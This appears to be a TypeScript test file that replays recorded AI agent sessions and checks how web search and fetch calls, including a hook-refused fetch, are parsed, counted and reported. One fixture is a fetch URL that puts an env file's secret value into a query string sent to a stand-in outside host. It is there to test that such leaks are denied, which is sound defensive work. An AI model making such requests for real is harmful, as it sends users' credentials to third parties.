// The web recordings replayed (DIPO-164; 0020 section 11b, 0017 section 2): the derived
// `web-calls` recording and the live `web` capture, each with a WebSearch, a WebFetch and a
// WebFetch the PreToolUse hook of an earlier binary refused, parse through the adapter, each web
// call shows in the worker output with its query or URL, the calls are counted by tool, and the
// recorded refusal names the env file and key and never the value. No session has hooks any more
// (0008, DIPO-347); the hook lines of these recordings are ignored.

import { describe, expect, it } from "bun:test";

import { webCallCounts } from "../../src/run/web-calls";
import { WEB_TOOLS } from "../../src/workers/claude-cli/tools";
import { loadRecording, replay } from "./replay";

// The fixture env file of the `web` scenario (tools/recordings/scenarios.ts).
const ENV = { file: ".env", key: "FIXTURE_API_KEY", value: "fixture-env-value-7f3a9c" };
const QUERY = "bun test runner documentation";
const URL = "https://bun.sh/docs/cli/test";
const REFUSED_URL = `https://example.com/lookup?token=${ENV.value}`;

/** The derived recording and the live capture of the `web` scenario. */
const WEB_RECORDINGS = ["web-calls", "web"];

type Json = Record<string, unknown>;

/** The stdout messages of the recording of `type`. */
function messages(name: string, type: string): Json[] {
  return loadRecording(name).lines.flatMap((line) => {
    const data = line.data as Json;
    return line.ch === "stdout" && data["type"] === type ? [data] : [];
  });
}

/** The message content blocks of the recording's stdout lines of `type`. */
function blocks(name: string, type: string): Json[] {
  return messages(name, type).flatMap((data) => {
    const content = (data["message"] as { content?: unknown } | undefined)?.content;
    return Array.isArray(content) ? (content as Json[]) : [];
  });
}

/** The ids of the recording's web tool uses, in order. */
function webCallIds(name: string): unknown[] {
  return blocks(name, "assistant")
    .filter((block) => block["type"] === "tool_use" && WEB_TOOLS.includes(String(block["name"])))
    .map((block) => block["id"]);
}

/** The text of a tool result: a string, or its text blocks joined. */
function resultText(content: unknown): string {
  if (typeof content === "string") return content;
  if (!Array.isArray(content)) return "";
  return (content as Json[]).map((part) => String(part["text"] ?? "")).join("");
}

/**
 * The result of the recording's third web call, found by order, not by id, so the test reads a
 * live capture of the `web` scenario as it reads the derived recording.
 */
function thirdWebResult(name: string): { text: string; isError: boolean } {
  const ids = webCallIds(name);
  const result = blocks(name, "user").find(
    (block) => block["type"] === "tool_result" && block["tool_use_id"] === ids[2],
  );
  return { text: resultText(result?.["content"]), isError: result?.["is_error"] === true };
}

for (const name of WEB_RECORDINGS) {
  describe(`the ${name} recording (DIPO-164)`, () => {
    it("parses, shows each web call with its query or URL, and counts the calls by tool", async () => {
      const run = await replay(loadRecording(name));
      expect(run.state.problems).toEqual([]);
      expect(run.state.unknownTypes).toEqual([]);

      const output = run.events.flatMap((event) => (event.t === "output" ? [event.text] : []));
      expect(output.filter((text) => text.startsWith("[web] "))).toEqual([
        `[web] WebSearch ${QUERY}\n`,
        `[web] WebFetch ${URL}\n`,
        `[web] WebFetch ${REFUSED_URL}\n`,
      ]);
      expect(webCallCounts(run.events)).toEqual({ searches: 1, fetches: 2 });
    });

    it("gives the refused call the engine's reason, naming the file and key and not the value", () => {
      const refused = thirdWebResult(name);
      expect(refused.isError).toBe(true);
      // Claude Code may wrap the hook's reason in text of its own.
      expect(refused.text).toContain(".env (FIXTURE_API_KEY)");
      expect(refused.text).not.toContain(ENV.value);
    });

    it("lists only the refused call in the result's permission_denials", () => {
      const [result] = messages(name, "result");
      const denials = (result?.["permission_denials"] ?? []) as Json[];
      expect(denials.map((denial) => [denial["tool_name"], denial["tool_use_id"]])).toEqual([
        ["WebFetch", webCallIds(name)[2]],
      ]);
    });
  });
}
